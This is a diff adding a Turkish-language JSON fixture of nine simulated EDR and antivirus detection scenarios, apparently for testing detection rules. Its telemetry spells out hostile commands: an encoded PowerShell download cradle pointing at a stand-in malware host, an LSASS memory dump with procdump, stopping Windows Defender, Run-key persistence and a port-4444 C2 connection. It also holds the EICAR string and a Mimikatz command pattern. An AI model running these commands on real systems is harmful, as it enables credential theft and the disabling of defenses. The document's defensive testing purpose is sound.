@@ -1,0 +1,181 @@
+{
+  "_aciklama": "Gün 148: EDR ve AV 9 Negatif Kontrol ve Tehdit Senaryosu",
+  "_lisans": "Özel Lisans — Tüm Hakları Saklıdır. Telif Hakkı (c) 2026 Seydi Eryılmaz (@seydivakkas)",
+  "senaryolar": [
+    {
+      "senaryo_id": "NS-EDR-01",
+      "ad": "Word Belgesinden PowerShell Başlatma (Office Makro Oltalama Saldırısı)",
+      "kategori": "Süreç Soy Ağacı Anomalisi",
+      "beklenen_kural": "EDR-RULE-001",
+      "beklenen_onem": "CRITICAL",
+      "mitre_teknik": "T1059.001",
+      "event": {
+        "event_id": "TEL-ATTACK-01",
+        "timestamp": "2026-11-03T10:00:00Z",
+        "event_type": "PROCESS_CREATE",
+        "pid": 5012,
+        "process_name": "powershell.exe",
+        "parent_pid": 4100,
+        "parent_name": "WINWORD.EXE",
+        "command_line": "powershell.exe -ExecutionPolicy Bypass -NoProfile -W Hidden",
+        "user": "KURUM\\kurban_kullanici"
+      }
+    },
+    {
+      "senaryo_id": "NS-EDR-02",
+      "ad": "Gizlenmiş / Base64 Kodlu PowerShell İndirme Kodu (Download Cradle)",
+      "kategori": "Kod Gizleme ve Savunma Atlama",
+      "beklenen_kural": "EDR-RULE-002",
+      "beklenen_onem": "CRITICAL",
+      "mitre_teknik": "T1059.001 / T1027",
+      "event": {
+        "event_id": "TEL-ATTACK-02",
+        "timestamp": "2026-11-03T10:01:00Z",
+        "event_type": "PROCESS_CREATE",
+        "pid": 5080,
+        "process_name": "powershell.exe",
+        "parent_pid": 5012,
+        "parent_name": "powershell.exe",
+        "command_line": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOiAvIC8gbQBhAGwAdwBhAHIAZQAuAGwAbwBjAGEAbAAnACkA",
+        "user": "KURUM\\kurban_kullanici"
+      }
+    },
+    {
+      "senaryo_id": "NS-EDR-03",
+      "ad": "LSASS Belleğinden Parola Dökümü Alma (Credential Dumping)",
+      "kategori": "Kimlik Bilgisi Erişimi",
+      "beklenen_kural": "EDR-RULE-003",
+      "beklenen_onem": "CRITICAL",
+      "mitre_teknik": "T1003.001",
+      "event": {
+        "event_id": "TEL-ATTACK-03",
+        "timestamp": "2026-11-03T10:02:00Z",
+        "event_type": "MEMORY_ACCESS",
+        "pid": 6200,
+        "process_name": "procdump.exe",
+        "parent_pid": 5012,
+        "parent_name": "powershell.exe",
+        "command_line": "procdump.exe -ma lsass.exe C:\\Temp\\lsass.dmp",
+        "user": "KURUM\\kurban_kullanici",
+        "details": {
+          "target_process": "C:\\Windows\\System32\\lsass.exe",
+          "access_mask": "0x1010"
+        }
+      }
+    },
+    {
+      "senaryo_id": "NS-EDR-04",
+      "ad": "Çapraz Süreç Bellek Enjeksiyonu (Process Injection / CreateRemoteThread)",
+      "kategori": "Savunma Atlama ve Süreç İhlali",
+      "beklenen_kural": "EDR-RULE-004",
+      "beklenen_onem": "CRITICAL",
+      "mitre_teknik": "T1055",
+      "event": {
+        "event_id": "TEL-ATTACK-04",
+        "timestamp": "2026-11-03T10:03:00Z",
+        "event_type": "MEMORY_ACCESS",
+        "pid": 6300,
+        "process_name": "inject.exe",
+        "parent_pid": 5012,
+        "parent_name": "powershell.exe",
+        "command_line": "inject.exe --target svchost.exe",
+        "user": "KURUM\\kurban_kullanici",
+        "details": {
+          "target_process": "svchost.exe",
+          "call_trace": "ntdll.dll!NtCreateThreadEx|KERNELBASE.dll!CreateRemoteThread"
+        }
+      }
+    },
+    {
+      "senaryo_id": "NS-EDR-05",
+      "ad": "Kayıt Defteri Otomatik Çalıştırma (Run Key) Kalıcılığı Sağlama",
+      "kategori": "Kalıcılık (Persistence)",
+      "beklenen_kural": "EDR-RULE-005",
+      "beklenen_onem": "HIGH",
+      "mitre_teknik": "T1547.001",
+      "event": {
+        "event_id": "TEL-ATTACK-05",
+        "timestamp": "2026-11-03T10:04:00Z",
+        "event_type": "REGISTRY_SET",
+        "pid": 6400,
+        "process_name": "persistence.exe",
+        "parent_pid": 5012,
+        "parent_name": "powershell.exe",
+        "command_line": "persistence.exe -install",
+        "user": "KURUM\\kurban_kullanici",
+        "details": {
+          "target_key": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "value_name": "SecurityHealthAgent",
+          "value_data": "C:\\ProgramData\\updater.exe"
+        }
+      }
+    },
+    {
+      "senaryo_id": "NS-EDR-06",
+      "ad": "Şüpheli Dış Porta (4444) Komuta Kontrol (C2) Ters Bağlantısı",
+      "kategori": "Komuta ve Kontrol (C2)",
+      "beklenen_kural": "EDR-RULE-006",
+      "beklenen_onem": "CRITICAL",
+      "mitre_teknik": "T1071",
+      "event": {
+        "event_id": "TEL-ATTACK-06",
+        "timestamp": "2026-11-03T10:05:00Z",
+        "event_type": "NETWORK_CONNECT",
+        "pid": 5012,
+        "process_name": "powershell.exe",
+        "parent_pid": 4100,
+        "parent_name": "WINWORD.EXE",
+        "command_line": "powershell.exe",
+        "user": "KURUM\\kurban_kullanici",
+        "details": {
+          "dest_ip": "198.51.100.99",
+          "dest_port": 4444,
+          "protocol": "TCP"
+        }
+      }
+    },
+    {
+      "senaryo_id": "NS-EDR-07",
+      "ad": "Windows Defender ve EDR Servisini Durdurma Girişimi",
+      "kategori": "Savunmayı Devre Dışı Bırakma (Tampering)",
+      "beklenen_kural": "EDR-RULE-007",
+      "beklenen_onem": "CRITICAL",
+      "mitre_teknik": "T1562.001",
+      "event": {
+        "event_id": "TEL-ATTACK-07",
+        "timestamp": "2026-11-03T10:06:00Z",
+        "event_type": "PROCESS_CREATE",
+        "pid": 6900,
+        "process_name": "cmd.exe",
+        "parent_pid": 5012,
+        "parent_name": "powershell.exe",
+        "command_line": "net stop WinDefend",
+        "user": "NT AUTHORITY\\SYSTEM"
+      }
+    },
+    {
+      "senaryo_id": "NS-EDR-08",
+      "ad": "Statik Antivirüs (AV) Taraması: EICAR Standart Test Dosyası",
+      "kategori": "Statik Dosya / AV İmzası",
+      "beklenen_kural": "AV-SIG-001",
+      "beklenen_onem": "MEDIUM",
+      "mitre_teknik": "T1204",
+      "file": {
+        "path": "C:\\Users\\kullanici\\Downloads\\eicar_test.com",
+        "content": "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
+      }
+    },
+    {
+      "senaryo_id": "NS-EDR-09",
+      "ad": "Statik Antivirüs (AV) Taraması: Mimikatz Parola Çalma Aracı Deseni",
+      "kategori": "Statik Dosya / YARA İmzası",
+      "beklenen_kural": "AV-SIG-002",
+      "beklenen_onem": "CRITICAL",
+      "mitre_teknik": "T1204 / T1003",
+      "file": {
+        "path": "C:\\Temp\\mimi_payload.exe",
+        "content": "MZ_DUMMY_HEADER_sekurlsa::logonpasswords_DUMMY_FOOTER"
+      }
+    }
+  ]
+}
